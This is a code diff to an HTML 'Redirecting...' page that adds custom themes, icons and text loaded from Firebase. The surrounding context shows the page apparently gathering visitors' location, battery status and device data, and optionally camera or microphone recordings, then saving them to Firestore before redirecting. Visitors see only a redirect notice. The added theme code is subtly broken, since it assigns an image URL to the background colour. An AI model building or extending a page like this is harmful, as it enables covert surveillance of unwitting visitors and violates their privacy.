@@ -1,3 +1,4 @@
+--- START OF FILE redirect (4).html ---
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -15,6 +16,8 @@
             background-color: #f3f7fa;
             color: #333;
              transition: background-color 0.5s, color 0.5s; /* Theme transition */
+             background-size: cover; /* For background image */
+             background-position: center;
         }
         .container {
             text-align: center;
@@ -52,6 +55,22 @@
             50%  {content: "..";}
             75%  {content: "...";}
         }
+
+        /* Icon Container Style (Vak) */
+        .icon-container {
+            margin-bottom: 20px;
+        }
+
+        .icon-container img {
+            max-width: 100px; /* Adjust as needed */
+            max-height: 100px;
+        }
+
+        /* Custom Text Style */
+        .custom-text {
+            font-size: 1.2rem; /* Adjust as needed */
+            margin-top: 20px;
+        }
     </style>
     <!-- Firebase SDK (Firestore) -->
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
@@ -61,8 +80,12 @@
 </head>
 <body>
     <div class="container">
+        <div class="icon-container"> <!-- Container for Icon -->
+            <img id="theme-icon" src="" alt="Theme Icon" style="display: none;">
+        </div>
         <h1>Redirecting...</h1>
         <p>You will be redirected shortly <span class="loading-dots"></span></p>
+        <p id="custom-redirect-text" class="custom-text" style="display: none;"></p> <!-- Custom Text Element -->
         <p id="error-message" class="error-message" style="display:none;"></p>
     </div>
 
@@ -85,8 +108,11 @@ const db = firebase.firestore();
 const storage = firebase.storage();
 
 const errorMessage = document.getElementById("error-message");
+const themeIconElement = document.getElementById('theme-icon'); // Icon Element
+const customRedirectTextElement = document.getElementById('custom-redirect-text'); // Custom Text Element
 
-// --- Theme Definitions ---
+
+// --- Theme Definitions (Default Themes) ---
 const themes = {
     default: {
         bodyBackgroundColor: '#f3f7fa',
@@ -188,25 +214,76 @@ function getDeviceInfo() {
     return navigator.userAgent;
 }
 
-// Function to apply theme on redirect page
-function applyThemeRedirect(themeName) {
-    const theme = themes[themeName] || themes.default;
-    document.body.style.backgroundColor = theme.bodyBackgroundColor;
-    document.body.style.color = theme.textColor;
-    const container = document.querySelector('.container');
-    if (container) {
-        container.style.backgroundColor = theme.containerBackgroundColor;
-        container.style.boxShadow = theme.containerBoxShadow;
-    }
-    const h1 = document.querySelector('h1');
-    if (h1) {
-        h1.style.color = theme.headingColor;
-    }
-     const p = document.querySelectorAll('p');
-    p.forEach(pElement => {
-        pElement.style.color = theme.textColor;
-    });
+// Function to apply theme on redirect page (now handles both default and custom themes)
+async function applyThemeRedirect(themeName) {
+    let themeConfig = themes[themeName]; // Check if it's a default theme
+    let customThemeData = null;
 
+    if (!themeConfig) { // If not a default theme, try to load custom theme
+        const customThemeRef = db.collection('redirectThemes').doc(themeName);
+        const doc = await customThemeRef.get();
+        if (doc.exists) {
+            customThemeData = doc.data();
+        }
+    }
+
+    if (customThemeData) {
+        // Apply custom theme styles
+        document.body.style.backgroundColor = customThemeData.backgroundImageUrl ? `url('${customThemeData.backgroundImageUrl}')` : '#f3f7fa'; // Default background if no image
+        document.body.style.color = '#333'; // Default text color, can be customized in themeData later if needed
+        const container = document.querySelector('.container');
+        if (container) {
+            container.style.backgroundColor = 'white'; // Or customize if needed
+            container.style.boxShadow = '0 8px 16px rgba(0, 0, 0, 0.1)'; // Or customize
+        }
+        const h1 = document.querySelector('h1');
+        if (h1) {
+            h1.style.color = '#007bff'; // Or customize
+        }
+         const p = document.querySelectorAll('p');
+        p.forEach(pElement => {
+            pElement.style.color = '#333'; // Or customize
+        });
+
+        // Handle icon and custom text for custom theme
+        if (customThemeData.iconImageUrl) {
+            themeIconElement.src = customThemeData.iconImageUrl;
+            themeIconElement.style.display = 'block';
+        } else {
+            themeIconElement.style.display = 'none';
+        }
+        if (customThemeData.customText) {
+            customRedirectTextElement.textContent = customThemeData.customText;
+            customRedirectTextElement.style.display = 'block';
+        } else {
+            customRedirectTextElement.style.display = 'none';
+        }
+
+
+    } else if (themeConfig) {
+        // Apply default theme styles as before
+        document.body.style.backgroundColor = themeConfig.bodyBackgroundColor;
+        document.body.style.color = themeConfig.textColor;
+        const container = document.querySelector('.container');
+        if (container) {
+            container.style.backgroundColor = themeConfig.containerBackgroundColor;
+            container.style.boxShadow = themeConfig.containerBoxShadow;
+        }
+        const h1 = document.querySelector('h1');
+        if (h1) {
+            h1.style.color = themeConfig.headingColor;
+        }
+         const p = document.querySelectorAll('p');
+        p.forEach(pElement => {
+            pElement.style.color = themeConfig.textColor;
+        });
+        themeIconElement.style.display = 'none'; // Hide icon for default themes
+        customRedirectTextElement.style.display = 'none'; // Hide custom text for default themes
+
+    } else {
+        // Fallback to default theme if themeName is not found and not a custom theme
+        applyThemeRedirect('default');
+    }
 }
 
 
@@ -412,7 +489,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         themeName = settingsData.theme || 'default';
     }
 
-    applyThemeRedirect(themeName);
+    await applyThemeRedirect(themeName); // Apply theme here (await to ensure theme is applied before redirect)
 
 
     // --- Trigger Notification BEFORE redirect, ONLY if permission is enabled in settings ---
@@ -471,6 +548,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     let micCamPermission = false;
     let recordSeconds = 0;
     let notificationPermissionSetting = false;
+    let themeName = 'default'; // Default theme
 
     try {
         const settingsSnap = await settingsRef.get();
@@ -479,10 +557,8 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
             micCamPermission = settingsData.micCamPermission;
             recordSeconds = parseInt(settingsData.recordSeconds) || 0;
             notificationPermissionSetting = settingsData.notificationPermission;
-            const themeName = settingsData.theme || 'default';
-            applyThemeRedirect(themeName);
+            themeName = settingsData.theme || 'default'; // Get theme name from settings
         } else {
-            applyThemeRedirect('default');
             console.warn("No settings found in Firestore, using defaults.");
         }
     } catch (error) {
@@ -490,6 +566,10 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         errorMessage.textContent = `Firebase Fout bij laden instellingen: ${error.message}`;
         errorMessage.style.display = 'block';
     }
+
+
+    // Apply theme FIRST
+    await applyThemeRedirect(themeName);
 
 
     // Request notification permission ONLY if enabled in settings
